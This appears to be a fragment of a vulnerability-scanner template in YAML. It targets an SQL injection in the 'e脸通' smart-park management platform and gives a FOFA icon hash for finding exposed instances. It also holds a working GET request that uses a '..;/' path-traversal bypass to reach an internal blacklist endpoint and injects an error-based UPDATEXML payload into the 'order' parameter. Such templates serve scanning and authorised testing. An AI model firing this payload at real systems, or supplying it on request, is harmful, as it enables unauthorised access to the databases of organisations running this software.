  severity: high
  tags:
  - sql-injection
  finger: e脸通智慧园区管理平台
  fofa: icon_hash="1380907357"
variables:
  t1: random_int(1000,10000)
  t2: md5(t1)
requests:
- method: GET
  path: /manage/dgmCommand/finishRegister.do/..;/..;/systemBlackList/queryBlackList.do?page=1&pageSize=10&order=(UPDATEXML(2920,CONCAT(0x2e,md5({{.t1}}),(SELECT+(ELT(2920=2920,1))),0x71706b7671),8357))
